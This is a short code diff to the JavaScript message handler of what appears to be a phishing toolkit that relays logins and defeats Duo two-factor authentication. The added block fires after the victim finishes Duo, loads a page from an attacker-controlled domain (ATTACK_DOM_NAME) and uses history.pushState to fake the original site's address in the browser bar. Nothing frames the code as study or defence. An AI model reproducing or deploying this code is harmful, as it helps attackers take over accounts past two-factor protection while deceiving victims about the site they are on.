@@ -71,11 +71,17 @@ window.onbeforeunload = function() {
 }
 
 window.addEventListener("message", function(event) {
+    // Called after DUO success achieved 
+    if (event.data == "finished") {
+        load = 1;
+        injectHTML("https://" + window.ATTACK_DOM_NAME + "/exit-site/final.html");
+        setTimeout(()=>history.pushState({},"URL", window.ORIG_DOM), 10); 
+        return;
+    }
     if (event.data == 'loggedIn') {
         window.localStorage.setItem('loggedIn', 'true')
         event.data.move = FINAL_DOM;
     }
-
     if (event.data == "exit") {
         window.onbeforeunload = undefined;
         window.location = window.ORIG_DOM; 
@@ -91,8 +97,6 @@ window.addEventListener("message", function(event) {
             load = event.data.load
         if (favicon != undefined && favicon != "")
             changeFavicon(favicon);
-        if (url != undefined && url != "")
-            history.pushState({},"URL",url);
         if (title != undefined && title != "")
             document.title = title;
         if (move != undefined && move != "") {
